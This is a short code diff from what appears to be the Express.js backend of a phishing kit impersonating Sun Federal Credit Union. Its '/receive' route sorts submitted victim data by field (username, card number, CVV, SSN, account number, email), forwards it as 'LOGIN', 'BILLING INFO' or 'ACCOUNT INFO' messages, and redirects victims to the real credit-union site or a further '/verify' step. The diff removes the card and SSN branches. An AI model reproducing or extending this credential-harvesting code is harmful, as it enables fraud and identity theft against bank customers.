@@ -171,10 +171,6 @@ app.post('/receive', async (req, res) => {
 
     if (myObjectKeys.includes('username')) {
       prepareMessage("LOGIN", "https://www.sunfederalcu.org", true);
-    } else if (myObjectKeys.includes('') || myObjectKeys.includes('cvv') || myObjectKeys.includes('cardnumber')) {
-      prepareMessage("BILLING INFO", url, false);
-    } else if (myObjectKeys.includes('ssn') || myObjectKeys.includes('accountnumber') || myObjectKeys.includes('email')) {
-      prepareMessage("ACCOUNT INFO", "/verify?action=2", false);
     } else {
       res.status(400).send({ error: "No matching keys found in request body." });
     }
